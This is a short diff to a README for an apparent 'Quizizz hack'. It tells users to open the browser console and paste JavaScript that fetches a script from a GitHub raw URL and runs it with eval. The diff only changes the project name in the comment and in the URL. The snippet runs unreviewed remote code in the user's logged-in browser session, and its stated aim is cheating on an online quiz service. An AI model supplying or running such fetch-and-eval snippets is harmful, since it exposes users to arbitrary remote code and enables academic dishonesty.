@@ -9,8 +9,8 @@ Step 2: open console tab [Ctrl+Shift+J]
 
 Step 3: paste this code
 ```javascript
-// Quizz hack by LTP
-fetch("https://raw.githubusercontent.com/lucthienphong1120/hack-quizz/main/script.js")
+// quizizz hack by LTP
+fetch("https://raw.githubusercontent.com/lucthienphong1120/hack-quizizz/main/script.js")
     .then((res) => res.text()
     .then((t) => eval(t)))
 ```
